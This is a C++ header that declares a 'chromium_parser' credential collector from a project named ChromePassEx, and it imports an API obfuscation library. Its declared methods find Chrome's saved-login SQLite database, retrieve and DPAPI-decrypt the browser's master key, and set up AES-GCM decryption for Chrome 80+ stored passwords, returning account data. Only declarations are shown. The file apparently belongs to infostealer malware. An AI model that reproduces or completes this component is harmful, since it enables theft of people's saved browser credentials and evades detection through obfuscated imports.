#pragma once
#include <obfuscator/WinApiImport.h>
#include <sqlite3.h>
#include <string>
#include <vector>

#include "Forwards.h"
#include "ICollector.h"

#ifdef ChromePassEx_EXPORTS

#define EXPORT_F __declspec(dllexport)

	#else

#define EXPORT_F 

#endif

#define DPAPI_PREFIX_LEN 5
#define V10_LEN 3
#define NONCE_LEN 12
#define MAX_SIZE_PASS 1*1024






class EXPORT_F chromium_parser : public ICollector
{
public:
	explicit chromium_parser(const String& m_chromium_base_path = R"(\Google\Chrome)")
		: m_hAlg(nullptr), m_hKey(nullptr), m_chromium_base_path(m_chromium_base_path)
	{
	}

	~chromium_parser() = default;

	List<AccountData> collect_data() override;
	
private:
	bool get_path_to_db();
	bool get_decryption_key();
	bool get_chrome_key(std::string& key, unsigned long& keySize);
	bool get_key_path(String& keyPath);
	bool key_decrypt(std::string keyBase64, unsigned long keySize, char* decKey);
	static bool dpapi_decrypt(unsigned char* encText, unsigned long encTextSize, char* decText);
	bool init_for_chrome_80(void);
	bool init_key_for_chrome_80(IN PBYTE pbKey, IN ULONG sizeKey);


	
	char* m_pbOutput = nullptr;
	BCRYPT_ALG_HANDLE m_hAlg;
	BCRYPT_KEY_HANDLE m_hKey;
	String m_chrome_sqlite_path;
	const String m_chromium_base_path;
};

 

